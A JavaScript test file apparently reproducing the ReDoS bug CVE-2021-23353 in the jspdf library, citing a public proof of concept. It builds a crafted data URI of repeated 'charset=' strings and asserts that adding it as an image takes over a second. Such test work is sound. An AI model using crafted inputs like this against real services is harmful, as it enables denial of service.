function build_blank(n) {
	var ret = "data:/"
	for (var i = 0; i < n; i++) {
		ret += "charset="
	}
	return ret + "!";
}
//https://github.com/yetingli/PoCs/blob/main/CVE-2021-23353/jspdf.js
test("ReDos in jspdf", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const fs = require("fs");
    const { jsPDF } = require("jspdf")

    const doc = new jsPDF();
    doc.text("Hello world1111!", 10, 10);

    let t =measureTime(function () {
        let imageData = "data:image/png;base64,"

        var Octocat = fs.readFileSync("psb.png", { encoding: "latin1" });
        doc.addImage(build_blank(3) + imageData, "PNG", 10, 40, 1440, 1080, undefined, "SLOW",0);

        doc.save("a4ffff.pdf"); // will save the file in the current working directory
    
    });
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});